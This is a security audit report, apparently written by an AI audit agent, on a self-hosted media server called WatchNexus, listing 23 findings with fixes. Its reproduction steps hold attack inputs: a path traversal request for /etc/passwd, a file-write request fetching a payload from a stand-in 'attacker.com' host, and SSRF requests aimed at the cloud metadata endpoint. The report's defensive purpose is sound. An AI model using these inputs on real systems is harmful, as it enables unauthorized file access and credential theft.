# WatchNexus Security Audit Report

**Audit Date:** 2026-09-15  
**Auditor:** Security Audit Agent  
**Scope:** Backend (`src/watchnexus/core/`), Frontend (`src/web/src/`), Build/Deploy (Dockerfile, docker-compose.yml, GitHub workflows)  
**Version:** 1.0.3

---

## 1. Executive Summary

### Overall Risk Rating: **HIGH**

| Severity | Count | Status |
|----------|-------|--------|
| CRITICAL | 3 | Confirmed, 2 partially mitigated |
| HIGH | 6 | Confirmed |
| MEDIUM | 9 | Confirmed |
| LOW | 5 | Confirmed |

**Total Findings:** 23

### Key Observations

- **Strong Foundations:** Excellent JWT management (per-install secrets, token versioning, httpOnly cookies), encryption-at-rest via ASP.NET Core Data Protection, rate limiting, Fortress Protocol for tier enforcement, CSP headers, CSRF double-submit protection.
- **Critical Gaps:** Arbitrary file read/write in SubtitlesController, SSRF in multiple controllers via user-configured URLs, missing ownership checks in LibrariesController, XXE risk in PodcastsController.
- **Architecture Strengths:** Non-root Docker user, read-only rootfs, capability dropping, per-install secrets, no default admin credentials.

---

## 2. Detailed Findings

### CRITICAL

#### C1: SubtitlesController — Arbitrary File Read via Path Traversal
**Location:** `src/watchnexus/core/Controllers/SubtitlesController.cs:181-187`

```csharp
[HttpGet("file/{*filePath}")]
public IActionResult ServeSubtitle(string filePath)
{
    var full = MediaPaths.ResolveRealPath("/" + filePath);  // User-controlled
    if (full == null || !MediaPaths.IsAllowedPath(full) || !System.IO.File.Exists(full)) return NotFound();
    return PhysicalFile(full, "text/plain");
}
```

**Impact:** Path traversal to read any file within allowed media roots. While `MediaPaths.IsAllowedPath` validates against configured roots, the `{*filePath}` catch-all route parameter allows directory traversal sequences (`../../../etc/passwd`) that `ResolveRealPath` canonicalizes. If media roots include broad paths (e.g., `/data`), sensitive files may be accessible.

**Reproduction:**
```
GET /api/subtitles/file/../../../../etc/passwd
```

**Remediation:**
```csharp
[HttpGet("file/{*filePath}")]
public async Task<IActionResult> ServeSubtitle(string filePath)
{
    // Sanitize: reject path traversal attempts BEFORE resolution
    if (filePath.Contains("..") || Path.IsPathRooted(filePath))
        return BadRequest(new { detail = "Invalid path" });

    var full = MediaPaths.ResolveRealPath(Path.Combine("/", filePath));
    if (full == null || !MediaPaths.IsAllowedPath(full) || !System.IO.File.Exists(full))
        return NotFound();

    // Additional: verify file extension is subtitle format
    var ext = Path.GetExtension(full).ToLowerInvariant();
    if (!new[] { ".srt", ".vtt", ".ass", ".sub" }.Contains(ext))
        return BadRequest(new { detail = "Not a subtitle file" });

    return PhysicalFile(full, "text/plain");
}
```

---

#### C2: SubtitlesController — Arbitrary File Write via DownloadSubtitle
**Location:** `src/watchnexus/core/Controllers/SubtitlesController.cs:126-179`

```csharp
[HttpPost("download")]
public async Task<IActionResult> DownloadSubtitle(
    [FromQuery] string? download_url, [FromQuery] string? media_path) // user-controlled
{
    // ... fetches download_url (SSRF guard: IsAllowedUrl)
    if (!string.IsNullOrEmpty(media_path))
    {
        if (!MediaPaths.IsAllowedPath(media_path))
            return BadRequest(new { detail = "media_path is outside configured media directories" });
        var srtPath = Path.ChangeExtension(media_path, ".srt");  // User controls extension
        if (!MediaPaths.IsAllowedPath(srtPath))
            return BadRequest(new { detail = "subtitle output path outside configured media directories" });
        await System.IO.File.WriteAllBytesAsync(srtPath, data);  // ARBITRARY WRITE
    }
}
```

**Impact:** Authenticated user can write arbitrary binary content to any `.srt` file within allowed media roots. Combined with path traversal in `media_path`, could overwrite config files, scripts, or plant webshells if media root is web-accessible.

**Reproduction:**
```
POST /api/subtitles/download?media_path=/data/media/../../app/appsettings.json
Content-Type: application/json
{"download_url": "https://attacker.com/payload.srt", "media_id": "x"}
```

**Remediation:**
```csharp
// Validate media_path is a REAL media file (not arbitrary path)
var media = await _db.MediaItems.FirstOrDefaultAsync(m => m.FilePath == media_path && m.LibraryId == libraryId);
if (media == null) return BadRequest(new { detail = "media_path not found in library" });

// Enforce .srt extension only
var srtPath = Path.ChangeExtension(media.FilePath, ".srt");
if (!MediaPaths.IsAllowedPath(srtPath)) return BadRequest(...);

// Optional: validate subtitle content before write
if (!IsValidSubtitleFormat(data)) return BadRequest(new { detail = "Invalid subtitle format" });
```

---

#### C3: CompoteController — SSRF via User-Configured Indexer URLs
**Location:** `src/watchnexus/core/Controllers/MediaControllers.cs:571-646` (Search method)

```csharp
foreach (var idx in indexers)
{
    var url = doc.TryGetProperty("url", out var u) ? u.GetString() ?? "" : "";
    // ... 
    if (SsrfGuard.IsBlockedUrl(url)) continue;  // WEAK GUARD - allows RFC1918
    
    // Fetches user-controlled URL
    var xml = await http.GetStringAsync(feedUrl);  // Line 653, 703, 760, 806, 856
}
```

**Impact:** Authenticated user (or admin via compromised account) can add indexer pointing to internal services (AWS metadata `169.254.169.254`, Kubernetes API, internal APIs, localhost services). `SsrfGuard.IsBlockedUrl` only blocks cloud metadata endpoints and non-http(s) schemes — **explicitly allows RFC1918/private addresses** (see `SecurityHelpers.cs:164-177`).

**Reproduction:**
1. POST `/api/compote/indexers` with `{"name":"evil","url":"http://169.254.169.254/latest/meta-data/","type":"rss"}`
2. GET `/api/compote/search?query=test` → triggers fetch to AWS metadata endpoint

**Remediation:**
```csharp
// Use IsAllowedUrl (strict) for indexer searches, not IsBlockedUrl (lenient)
if (!SsrfGuard.IsAllowedUrl(url))  // Blocks private/loopback/link-local/multicast
    continue;

// OR: Maintain allowlist of approved indexer domains
private static readonly HashSet<string> ApprovedIndexerDomains = new()
{ "nyaa.si", "yts.mx", "yts.rs", "eztv.re", "1337x.to", "showrss.info" };
// Validate host against allowlist before fetching
```

---

### HIGH

#### H1: PodcastsController — Feed SSRF + XXE Risk
**Location:** `src/watchnexus/core/Controllers/PodcastsController.cs:66-115`

```csharp
[HttpPost]
public async Task<IActionResult> Subscribe([FromBody] JsonElement body)
{
    // User provides feed_url
    if (string.IsNullOrEmpty(sub.FeedUrl) || !SsrfGuard.IsAllowedUrl(sub.FeedUrl))
        return BadRequest(...);
    // ...
}

[HttpGet("{id}")]
public async Task<IActionResult> GetPodcast(string id)
{
    // Fetches user's stored feed_url
    using var stream = await http.GetStreamAsync(sub.FeedUrl);  // Line 78
    var xmlSettings = new XmlReaderSettings { DtdProcessing = DtdProcessing.Prohibit };
    using var reader = XmlReader.Create(stream, xmlSettings);
    var feed = SyndicationFeed.Load(reader);  // Line 81
}
```

**Impact:** 
- **SSRF:** User subscribes to `http://internal-service/admin` → server fetches internal endpoints. `IsAllowedUrl` allows RFC1918.
- **XXE:** `DtdProcessing.Prohibit` mitigates but `XmlReaderSettings` should also set `XmlResolver = null` and `DtdProcessing = DtdProcessing.Ignore`. SyndicationFeed.Load may still be vulnerable to billion laughs via deeply nested entities.

**Remediation:**
```csharp
// SSRF: Use strict allowlist for podcast feeds (public podcast directories only)
private static readonly HashSet<string> AllowedPodcastHosts = new()
{ "feeds.example.com", "rss.example.com" }; // Or validate against known podcast platforms

// XXE: Harden XmlReaderSettings
var xmlSettings = new XmlReaderSettings 
{ 
    DtdProcessing = DtdProcessing.Ignore,
    XmlResolver = null,
    MaxCharactersFromEntities = 1024,  // Limit entity expansion
    MaxCharactersInDocument = 10_000_000  // Limit document size
};
```

---

#### H2: WebVideoController — Arbitrary URL Proxy / Info Leakage
**Location:** `src/watchnexus/core/Controllers/WebVideoController.cs:78-94, 113-117`

```csharp
[HttpGet("info")]
public IActionResult VideoInfo([FromQuery] string url = "")
{
    if (string.IsNullOrWhiteSpace(url)) return BadRequest(...);
    // Extracts YouTube ID but makes NO validation on URL scheme/host
    if (url.Contains("youtube.com") || url.Contains("youtu.be")) { ... }
    return Ok(new { url, title, thumbnail, formats = Array.Empty<object>() });
}

[HttpGet("stream")]
public IActionResult Stream([FromQuery] string url = "")
{
    return BadRequest(new { detail = "Direct streaming requires yt-dlp integration." });
}
```

**Impact:** `VideoInfo` endpoint accepts any URL, reflects it in response. Could be used for:
- Internal port scanning (timing attacks via response time)
- SSRF to internal services (if yt-dlp integration added later without validation)
- Open redirect via reflected URL in error messages

**Remediation:**
```csharp
[HttpGet("info")]
public IActionResult VideoInfo([FromQuery] string url = "")
{
    if (!SsrfGuard.IsAllowedUrl(url))  // Strict validation
        return BadRequest(new { detail = "URL must be a public https endpoint" });
    
    // Only allow known video platforms
    var allowedHosts = new[] { "youtube.com", "youtu.be", "vimeo.com" };
    var host = new Uri(url).Host.ToLowerInvariant();
    if (!allowedHosts.Any(h => host.EndsWith(h)))
        return BadRequest(new { detail = "Unsupported video platform" });
    // ...
}
```

---

#### H3: ContentController (TmdbProxyController) — Fragile Host Rewrite
**Location:** `src/watchnexus/core/Controllers/ContentController.cs:53-75`

```csharp
private async Task<IActionResult> ProxyGet(string path, Dictionary<string, string>? extra = null)
{
    var key = await GetApiKey();
    var client = _http.CreateClient();
    var qs = $"?api_key={key}&language=en-US";  // String concatenation
    // ...
    var resp = await client.GetAsync($"{TMDB_BASE}{path}{qs}");
}
```

**Impact:** While not directly exploitable, string-based URL construction is fragile. If `path` or `extra` parameters are user-controlled (they're not currently), could lead to injection. TMDB API key exposed in request URL (logged in proxy/access logs).

**Remediation:** Use `UriBuilder` or `HttpRequestMessage` with proper query parameter encoding. Move API key to header if TMDB supports it.

---

#### H4: LibrariesController — No Ownership Model (Global Data Exposure)
**Location:** `src/watchnexus/core/Controllers/LibrariesController.cs:34-45`

```csharp
[HttpGet]
public async Task<IActionResult> GetAll()
{
    var libs = await _db.Libraries.OrderByDescending(l => l.CreatedAt).ToListAsync();  // NO USER FILTER
    return Ok(libs.Select(l => new { l.Id, l.Name, l.Path, ... }));
}
```

**Impact:** Any authenticated user can enumerate ALL libraries across ALL users, including:
- Full filesystem paths on server (`/data/media/Movies`, `/home/user/private`)
- Library names, media types, item counts, total sizes
- Scan status and timestamps

**Remediation:**
```csharp
[HttpGet]
public async Task<IActionResult> GetAll()
{
    var userId = this.UserId();
    var libs = await _db.Libraries
        .Where(l => l.UserId == userId)  // ADD USER FILTER
        .OrderByDescending(l => l.CreatedAt).ToListAsync();
    // ...
}

// Also fix GetById, GetMedia, Scan, etc. to verify ownership
[HttpGet("{id}")]
public async Task<IActionResult> GetById(string id)
{
    var lib = await _db.Libraries.FirstOrDefaultAsync(l => l.Id == id && l.UserId == this.UserId());
    if (lib == null) return NotFound();
    // ...
}
```

---

#### H5: QBittorrentController / SettingsController — SSRF via Weak Guard
**Location:** `src/watchnexus/core/Controllers/QBittorrentController.cs:29,53,73,103,141,157` and `SettingsController.cs:173`

```csharp
// QBittorrentController uses IsBlocked (allows RFC1918)
if (WatchNexus.Core.Auth.SsrfGuard.IsBlocked(host))
    return BadRequest(...);

// SettingsController.TestQbit explicitly blocks loopback but allows other private IPs
if (ip != null && (IPAddress.IsLoopback(ip) || ip.ToString() is "127.0.0.1" or "::1"))
    return BadRequest(...);  // But 192.168.x.x, 10.x.x.x allowed!
```

**Impact:** User can configure qBittorrent to point to internal services (RPC endpoints, databases, admin panels on LAN). The `IsBlocked` guard is intentionally lenient for LAN download clients, but this creates SSRF surface.

**Remediation:**
```csharp
// For user-configurable integrations, require explicit allowlist or use strict IsAllowedUrl
// with additional validation: only allow hosts that respond with expected service signature
if (!SsrfGuard.IsAllowedUrl($"http://{host}:{port}"))  // Strict
    return BadRequest(new { detail = "Host not allowed" });

// Verify it's actually qBittorrent by checking response
var resp = await http.GetAsync($"http://{host}:{port}/api/v2/app/version");
if (!resp.IsSuccessStatusCode || !await IsQbitResponse(resp))
    return BadRequest(new { detail = "Not a valid qBittorrent instance" });
```

---

#### H6: CrucibleController — Command Injection Risk via FFmpeg Arguments
**Location:** `src/watchnexus/core/Controllers/CrucibleController.cs:200-223`

```csharp
private static async Task<object?> RunFfprobe(string path)
{
    var psi = new ProcessStartInfo(ffprobe) { ... };
    psi.ArgumentList.Add("-v"); psi.ArgumentList.Add("quiet");
    // ... 
    psi.ArgumentList.Add(path);  // path validated via MediaPaths.IsAllowedPath
    var proc = Process.Start(psi);
}
```

**Impact:** `path` is validated via `MediaPaths.IsAllowedPath` which resolves symlinks and checks against allowed roots. **Currently safe** because `ArgumentList` is used (no shell interpretation). However, if code changes to use `Arguments` string with interpolation, command injection becomes possible.

**Remediation:** Keep using `ArgumentList`. Add code comment warning. Consider allowlist of allowed ffprobe arguments.

---

### MEDIUM

#### M1: LibrariesController — Static `_scanJobs` Dictionary (Unbounded, Cross-User, Lost on Restart)
**Location:** `src/watchnexus/core/Controllers/LibrariesController.cs:21-22, 175-210`

```csharp
private static readonly Dictionary<string, object> _scanJobs = new();
private static readonly Dictionary<string, CancellationTokenSource> _scanTokens = new();
```

**Impact:**
- **Memory leak:** Unbounded growth — entries never cleaned up after completion
- **Cross-user leakage:** Static dictionary shared across all users; scan job IDs predictable (GUID prefix)
- **Data loss:** All scan state lost on app restart
- **DoS:** Malicious user can create many scan jobs to exhaust memory

**Remediation:**
```csharp
// Use persistent storage (DB table) with user_id, TTL cleanup
// Or: IMemoryCache with sliding expiration
// Or: Distributed cache (Redis) for multi-instance deployments
```

---

#### M2: MediaControllers.IsAllowedMediaPath — Prefix Check Only (Symlink Bypass Possible)
**Location:** `src/watchnexus/core/Controllers/MediaControllers.cs:366-378` and `SecurityHelpers.cs:265-284`

```csharp
// MediaControllers.cs - OLD implementation (lines 366-378)
private static bool IsAllowedMediaPath(string? path)
{
    var full = Path.GetFullPath(path).TrimEnd(...);  // NO SYMLINK RESOLUTION
    foreach (var root in ResolveAllowedMediaRoots())
    {
        var rootFull = Path.GetFullPath(root).TrimEnd(...);
        if (full.StartsWith(rootFull + Path.DirectorySeparatorChar)) return true;  // PREFIX CHECK
    }
    return false;
}
```

**Note:** `SecurityHelpers.cs` has a **better** `MediaPaths.IsAllowedPath` that resolves symlinks via `ResolveLinkTarget`. But `MediaControllers.cs` uses its own older implementation. Inconsistency creates bypass risk.

**Remediation:** Consolidate to single `MediaPaths.IsAllowedPath` from `SecurityHelpers.cs` everywhere. Delete duplicate in `MediaControllers.cs`.

---

#### M3: Dead Code Stubs Returning 501 (Attack Surface)
**Location:** Multiple controllers

| Controller | Endpoint | Issue |
|------------|----------|-------|
| `QualityProfilesController` | POST/PUT/DELETE `/api/quality-profiles` | 501 stubs, should be removed or implemented |
| `MediaOpsController` | POST `/api/media/redownload` | 501 stub |
| `MediaOpsController` | POST `/api/media/scheduled-scans/{id}/run` | Implemented but GET `/api/media/scheduled-scans` returns user-scoped, POST creates user-scoped |
| `IptvController` | GET `/api/iptv/epg/{channelId}` | Returns empty array (stub) |
| `BacklogControllers` | `BiscottiController.Scan`, `TreacleController.Scan` | Accept user-controlled paths, check `Directory.Exists` but NOT `MediaPaths.IsAllowedPath` |

**Impact:** Dead code increases attack surface, confuses API consumers, may hide bugs.

**Remediation:** Remove unused endpoints or implement properly with full validation.

---

#### M4: Hardcoded TMDB CDN URLs — Centralized But Not Configurable
**Location:** `src/web/src/lib/config.js:42-46`, used in 15+ frontend files

```javascript
const TMDB_IMAGE_BASE = 'https://image.tmdb.org/t/p';
const TMDB_IMAGE_WIDTHS = { small: 'w92', medium: 'w342', large: 'w1280' };
export const tmdbImageUrl = (path, size = 'medium') => 
  `${TMDB_IMAGE_BASE}/${TMDB_IMAGE_WIDTHS[size] || size}${path}`;
```

**Impact:** 
- Single point of failure if TMDB changes CDN
- No fallback for air-gapped/offline deployments
- Hardcoded HTTPS — no HTTP fallback for local development with self-signed certs

**Remediation:** Make configurable via `REACT_APP_TMDB_IMAGE_BASE` env var. Add fallback to local proxy endpoint.

---

#### M5: SubtitlesController — Missing Ownership Check on ServeSubtitle
**Location:** `src/watchnexus/core/Controllers/SubtitlesController.cs:181-187`

Unlike `PhotosController.ServePhoto` (lines 102-121) which verifies the file belongs to one of the user's photo libraries, `SubtitlesController.ServeSubtitle` only checks global media root allowlist. User A can access User B's subtitles if they know/guess the path.

**Remediation:** Add ownership check similar to PhotosController:
```csharp
var libs = await _db.Libraries.Where(l => l.UserId == this.UserId()).ToListAsync();
var allowed = libs.Any(l => MediaPaths.IsPathInside(MediaPaths.ResolveRealPath(l.Path) ?? "", full));
if (!allowed) return NotFound();
```

---

#### M6: PodcastsController — No Rate Limiting on Feed Fetching
**Location:** `src/watchnexus/core/Controllers/PodcastsController.cs:77-98`

`GetPodcast` fetches and parses RSS feed on every request. No caching, no rate limiting. User can subscribe to large/slow feeds and trigger repeated fetches (DoS).

**Remediation:** Add `IMemoryCache` with 1-hour TTL. Add rate limit per user (e.g., 10 feeds/hour).

---

#### M7: SettingsController — Bulk Settings Overwrite Without Validation
**Location:** `src/watchnexus/core/Controllers/SettingsController.cs:67-86`

```csharp
[HttpPut]
public async Task<IActionResult> SetBulk([FromBody] JsonElement body)
{
    foreach (var prop in body.EnumerateObject())
    {
        var key = prop.Name;
        if (IsReservedKey(key)) continue;  // Only defense
        // ... writes ANY key/value
    }
}
```

**Impact:** While `IsReservedKey` blocks known sensitive prefixes, new sensitive settings added later won't be protected. No validation of value types/sizes.

**Remediation:** Define explicit allowlist of user-editable settings. Reject unknown keys.

---

#### M8: IPTV Controller — M3U Parsing Without Size Limits
**Location:** `src/watchnexus/core/Controllers/IptvController.cs:228-258`

```csharp
private static List<IptvChannel> ParseM3U(string content, string sourceId)
{
    var lines = content.Split('\n', StringSplitOptions.RemoveEmptyEntries);
    // No limit on lines, content size, or channel count
    foreach (var rawLine in lines) { ... }
}
```

**Impact:** Malicious M3U playlist with millions of lines → memory exhaustion. `RefreshSource` fetches and parses entire playlist in memory.

**Remediation:** Add limits: max 50k lines, max 10MB content, max 10k channels.

---

#### M9: BacklogControllers (Biscotti/Treacle) — Scan Endpoint Path Validation Missing
**Location:** `src/watchnexus/core/Controllers/BacklogControllers.cs:105-161, 256-266`

```csharp
[HttpPost("scan")]
public IActionResult Scan([FromBody] JsonElement body)
{
    var path = body.TryGetProperty("path", out var p) ? p.GetString() : null;
    if (string.IsNullOrEmpty(path) || !Directory.Exists(path))
        return BadRequest(...);
    // NO MediaPaths.IsAllowedPath CHECK!
    // Scans arbitrary filesystem paths
}
```

**Impact:** Authenticated user can scan any directory the process has read access to (e.g., `/etc`, `/var`, `/app`, source code).

**Remediation:** Add `if (!MediaPaths.IsAllowedPath(path)) return BadRequest(...);` before `Directory.Exists`.

---

### LOW

#### L1: RadioController — Hardcoded External API Dependency
**Location:** `src/watchnexus/core/Controllers/RadioController.cs:16`

```csharp
private const string RadioApi = "https://de1.api.radio-browser.info/json";
```

**Impact:** Single point of failure. No fallback, no timeout configuration visible (uses default HttpClient timeout). If radio-browser.info is compromised, could serve malicious station data.

**Remediation:** Make configurable. Add circuit breaker. Validate/sanitize response before returning to frontend.

---

#### L2: CSP Includes 'unsafe-eval' and 'unsafe-inline'
**Location:** `src/watchnexus/core/Program.cs:518-529`

```csharp
ctx.Response.Headers["Content-Security-Policy"] =
    "default-src 'self'; " +
    "script-src 'self' 'unsafe-inline' 'unsafe-eval'; " +  // WEAKENS CSP
    "style-src 'self' 'unsafe-inline'; " +
    ...
```

**Impact:** Reduces effectiveness of CSP against XSS. Required by Create React App (CRA) build. Nonce-based CSP would be stronger but requires build changes.

**Remediation:** Migrate to Vite/RSPack for nonce-supporting build, or use `meta` tag CSP with nonce.

---

#### L3: Cookie Security — Missing Secure/SameSite in Development
**Location:** `src/watchnexus/core/Program.cs` — JWT cookie set via `AuthService` but cookie options not explicitly configured for `Secure`/`SameSite` in all paths.

**Impact:** In development (HTTP), cookies may not have `Secure` flag. `SameSite=Lax` default is OK but `Strict` would be better for auth cookies.

**Remediation:** Explicitly configure cookie options in `JwtBearerEvents.OnSigningIn` or cookie authentication scheme.

---

#### L4: Audit Logging — Incomplete Coverage
**Location:** `AppDbContext.cs:129-137` defines `AuditLog` but few controllers write to it.

**Impact:** Security-relevant actions (login, license changes, settings modifications, file operations) not consistently logged.

**Remediation:** Add `AuditLog` writes to all mutation endpoints. Consider structured logging to SIEM.

---

#### L5: Frontend — Legacy Token Purge Only on Load
**Location:** `src/web/src/index.js:16-21`

```javascript
try {
  localStorage.removeItem("token");
  localStorage.removeItem("access_token");
  localStorage.removeItem("watchnexus_token");
  localStorage.removeItem("watchnexus_user");
} catch { /* private mode */ }
```

**Impact:** Only runs once on app load. If XSS occurs after load, tokens could be re-stored by malicious code.

**Remediation:** Add periodic purge interval. Use `sessionStorage` instead of `localStorage` for any temporary auth state.

---

## 3. Security Test Coverage

| Vulnerability | Covered by Tests? | Test File |
|---------------|-------------------|-----------|
| C1 File Read | ❌ No | — |
| C2 File Write | ❌ No | — |
| C3 SSRF Compote | ❌ No | — |
| H1 Podcast SSRF/XXE | ❌ No | — |
| H2 WebVideo Proxy | ❌ No | — |
| H3 TMDB Proxy | ❌ No | — |
| H4 Libraries Ownership | ❌ No | — |
| H5 qBittorrent SSRF | ❌ No | — |
| H6 Crucible Cmd Injection | ❌ No | — |
| M1 Static ScanJobs | ❌ No | — |
| M2 Path Validation | ❌ No | — |
| M3 Dead Stubs | ❌ No | — |
| M4 TMDB URLs | ❌ No | — |
| M5 Subtitle Ownership | ❌ No | — |
| M6 Podcast Rate Limit | ❌ No | — |
| M7 Settings Bulk | ❌ No | — |
| M8 IPTV M3U Limits | ❌ No | — |
| M9 Biscotti/Treacle Scan | ❌ No | — |
| L1 Radio API | ❌ No | — |
| L2 CSP unsafe-eval | ✅ Documented in test | `frontend-security.test.js:195-200` |
| L3 Cookie Flags | ❌ No | — |
| L4 Audit Logging | ❌ No | — |
| L5 Token Purge | ✅ Tested | `frontend-security.test.js:60-70` |

**Summary:** Only 2 of 23 findings have test coverage. Critical/High findings have **zero** test coverage.

---

## 4. Remediation Priority & Effort Estimates

### Phase 1: Critical (Week 1-2)

| Finding | Effort | Priority |
|---------|--------|----------|
| C1 Subtitles File Read | 4h | P0 |
| C2 Subtitles File Write | 4h | P0 |
| C3 Compote SSRF | 8h | P0 |
| **Subtotal** | **16h** | |

### Phase 2: High (Week 2-3)

| Finding | Effort | Priority |
|---------|--------|----------|
| H1 Podcast SSRF/XXE | 8h | P1 |
| H2 WebVideo Proxy | 4h | P1 |
| H3 TMDB Proxy | 4h | P1 |
| H4 Libraries Ownership | 8h | P1 |
| H5 qBittorrent SSRF | 8h | P1 |
| H6 Crucible Hardening | 2h | P1 |
| **Subtotal** | **34h** | |

### Phase 3: Medium (Week 3-4)

| Finding | Effort | Priority |
|---------|--------|----------|
| M1 Static ScanJobs | 8h | P2 |
| M2 Path Validation Consolidation | 4h | P2 |
| M3 Dead Stubs Cleanup | 8h | P2 |
| M4 TMDB Configurable | 4h | P2 |
| M5 Subtitle Ownership | 4h | P2 |
| M6 Podcast Rate Limit | 4h | P2 |
| M7 Settings Allowlist | 4h | P2 |
| M8 IPTV M3U Limits | 4h | P2 |
| M9 Biscotti/Treacle Scan | 4h | P2 |
| **Subtotal** | **44h** | |

### Phase 4: Low (Week 4+)

| Finding | Effort | Priority |
|---------|--------|----------|
| L1 Radio API Config | 2h | P3 |
| L2 CSP Nonce Migration | 16h | P3 |
| L3 Cookie Secure/SameSite | 2h | P3 |
| L4 Audit Logging | 16h | P3 |
| L5 Token Purge Interval | 2h | P3 |
| **Subtotal** | **38h** | |

**Total Estimated Effort: ~132 hours (~3.5 weeks for 1 developer)**

---

## 5. Security Hardening Checklist

### Configuration
- [ ] Set `ALLOWED_ORIGINS` env var in production (lock down CORS)
- [ ] Set `TRUSTED_PROXY_IPS` for reverse proxy header trust
- [ ] Set `FORCE_HTTPS=1` behind TLS-terminating proxy (enables HSTS)
- [ ] Set `JWT_SECRET` env var (32+ chars) — do not rely on auto-generation
- [ ] Set `LICENSE_SERVER_API_KEY` for license validation
- [ ] Set `TMDB_API_KEY` for metadata
- [ ] Configure `MEDIA_ROOTS` to minimal required paths (not `/data` root)

### HTTP Headers (Program.cs middleware)
- [x] X-Content-Type-Options: nosniff
- [x] X-Frame-Options: DENY
- [x] X-XSS-Protection: 1; mode=block
- [x] Referrer-Policy: strict-origin-when-cross-origin
- [x] CSP (but weaken by unsafe-inline/unsafe-eval)
- [ ] Upgrade CSP to nonce-based (requires build change)
- [ ] Add Permissions-Policy header
- [ ] Add Cross-Origin-Opener-Policy / Cross-Origin-Embedder-Policy

### Dependencies
- [ ] Enable Dependabot/Renovate for NuGet and npm
- [ ] Pin Docker base images by digest (e.g., `node:22-alpine@sha256:...`)
- [ ] Run `dotnet list package --vulnerable --include-transitive` in CI (already in security-scan.yml)
- [ ] Run `yarn audit --level high` in CI (already in security-scan.yml)
- [ ] Run CodeQL for C# and JavaScript (already in security-scan.yml)
- [ ] Run gitleaks secret scan (already in security-scan.yml)

### Secrets Management
- [x] No secrets in source code (verified)
- [x] JWT secret generated per-install, stored in data dir with restricted perms
- [x] Data Protection keys persisted to data dir with restricted perms
- [x] Encryption-at-rest for credential columns (AppSetting.Value, VpnPeer keys)
- [ ] Rotate JWT secret annually (document procedure)
- [ ] Use external secret store (HashiCorp Vault, Azure Key Vault) for multi-node deployments

### Docker/Container Hardening
- [x] Non-root user (watchnexus:watchnexus)
- [x] Read-only rootfs
- [x] Capability drop: ALL
- [x] no-new-privileges
- [x] tmpfs for /tmp
- [x] Resource limits (CPU/memory)
- [ ] Add seccomp profile
- [ ] Sign images (cosign)
- [ ] Scan images for vulnerabilities (trivy/grype in CI)

### Network
- [ ] Deploy behind reverse proxy (Caddy/nginx/Traefik) with TLS
- [ ] Rate limit at proxy level (complement app-level)
- [ ] WAF rules for common attack patterns
- [ ] Restrict outbound egress (egress firewall) — block metadata endpoints

---

## 6. Compliance Notes

### GDPR (General Data Protection Regulation)
| Requirement | Status | Notes |
|-------------|--------|-------|
| Data minimization | ⚠️ Partial | Stores media paths, watch history, IP addresses in AuditLog |
| Right to erasure | ⚠️ Partial | No automated "delete my data" endpoint; manual DB cleanup needed |
| Data portability | ❌ No | No export endpoint for user data |
| Encryption at rest | ✅ Yes | SQLite DB encrypted via Data Protection for sensitive columns |
| Encryption in transit | ✅ Yes | HTTPS enforced via reverse proxy + HSTS |
| DPIA (Data Protection Impact Assessment) | ❌ No | Recommended for media server processing viewing habits |

**Recommendation:** Add `/api/users/me/export` (GDPR Art. 20) and `/api/users/me/delete` (Art. 17) endpoints.

### Data Residency
- SQLite database stored in `WATCHNEXUS_DATA_DIR` (default `/app/data` in Docker, `/var/lib/watchnexus` on Linux)
- Media files in configured `MEDIA_ROOTS`
- No cross-border data transfers except TMDB API calls (US-based)
- **Action:** Document data locations for user transparency

### Encryption Standards
| Data | Algorithm | Key Management |
|------|-----------|----------------|
| JWT signing | HMAC-SHA256 | 48-byte per-install secret (hex) |
| Password hashing | BCrypt (cost 11 default) | Per-user salt |
| Data Protection (secrets) | AES-256-CBC + HMAC-SHA256 | Per-install keys in data dir |
| TLS | TLS 1.2/1.3 | Managed by reverse proxy |

**All meet or exceed current standards.**

### OWASP Top 10 (2021) Coverage

| Category | Mitigations | Gaps |
|----------|-------------|------|
| A01 Broken Access Control | Fortress tier enforcement, UserId scoping in most controllers | H4: LibrariesController missing ownership |
| A02 Cryptographic Failures | Per-install JWT, BCrypt, Data Protection | L2: CSP weakened |
| A03 Injection | Parameterized EF Core, ArgumentList for Process | C2: File write, H1: XXE risk |
| A04 Insecure Design | Fortress Protocol, fail-closed tier checks | M1: Static state design |
| A05 Security Misconfiguration | Secure Docker defaults, no default admin | L3: Cookie flags |
| A06 Vulnerable Components | CodeQL, dependency audits in CI | — |
| A07 Identity/Auth Failures | httpOnly cookie, token versioning, rate limiting | — |
| A08 Software/Data Integrity | Fortress integrity checks, signed updates | — |
| A09 Logging/Monitoring | Structured JSON logs, boot crash capture | L4: Incomplete audit logging |
| A10 SSRF | SsrfGuard (partial) | C3, H1, H2, H5: Multiple SSRF vectors |

---

## 7. Recommended Immediate Actions

1. **Today:** Fix C1, C2, C3 (Critical file access + SSRF)
2. **This Week:** Fix H1, H4 (Podcast SSRF + Libraries ownership — highest impact)
3. **This Week:** Consolidate `MediaPaths.IsAllowedPath` (M2) — single source of truth
4. **Next Sprint:** Implement test coverage for all Critical/High findings
5. **Ongoing:** Add audit logging to all mutation endpoints

---

## Appendix: Files Reviewed

### Backend Controllers (28 files)
- SubtitlesController.cs, PhotosController.cs, MediaControllers.cs
- PodcastsController.cs, WebVideoController.cs, ContentController.cs
- LibrariesController.cs, IptvController.cs, QBittorrentController.cs
- SettingsController.cs, CrucibleController.cs, RadioController.cs
- FortressController.cs, BacklogControllers.cs, Helpers.cs
- Auth/AuthService.cs, Auth/SecurityHelpers.cs, Auth/CsrfProtection.cs
- Services/SecretProtector.cs, Data/AppDbContext.cs
- Program.cs

### Frontend (15+ files)
- AuthContext.js, LicenseContext.js, config.js, index.js
- frontend-security.test.js
- 15+ pages/components using tmdbImageUrl

### Build/Deploy
- Dockerfile, docker-compose.yml
- .github/workflows/security-scan.yml
- .github/workflows/docker-publish.yml

---

*End of Report*